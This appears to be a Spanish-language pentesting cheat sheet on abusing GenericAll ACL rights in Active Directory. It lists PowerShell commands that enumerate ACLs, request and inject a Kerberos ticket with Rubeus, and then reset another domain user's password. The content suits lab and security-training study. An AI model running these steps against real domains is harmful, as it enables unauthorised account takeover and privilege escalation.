# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericAll sobre Usuario

```powershell
❯ import-module .\Microsoft.ActiveDirectory.Management.dll  # Usar comandos como "Get-NetUser, Get-DomainUser, Get-ADUser y se filtra con '*'"

❯ Get-ADUser -Identity "userall.user"   # Identificar al usuario que tiene los permisos de 'GenericAll'

❯ $user = Get-ADUser -Identity "userall.user"   # Creamos una variable con el objeto 
❯ $user.SID                                     # Llamamos al SID del objeto 

❯ $SID = Convert-NameToSid userall.user         # Convertimos el nombre del objeto 'usuario' a su SID
❯ $SID                                          # Llamamos al SID del objeto 'usuario'

❯ Get-ObjectAcl -SamAccountName userwrite.user -ResolveGUIDs | Where-Object{$_.ActiveDirectoryRights -eq "GenericAll" -and $_.SecurityIdentifier -eq $SID } | select AceType,ActiveDirectoryRights,ObjectDN | fl  # Enumeramos ACL 

# Otra forma de hacerlo 
❯ Get-ObjectAcl -SamAccountName userwrite.user -ResolveGUIDs | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | ?{$_.IdentityName -match 'userall.user'} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 

❯ ./Rubeus.exe asktgt /user:userall.user /password:Password@1 /ptt  # Solicitamos el TGT con la password haciendo Pass-The-Ticket

❯ klist         # Mirar todos los tickets que se encuentran para los diferentes servicios 
❯ klist purge   # Eliminar los tickets que estan en cache

❯ net user userwrite.user P4ssw0rd /domain    # Cambiar la password al usuario 'userwrite.user'
```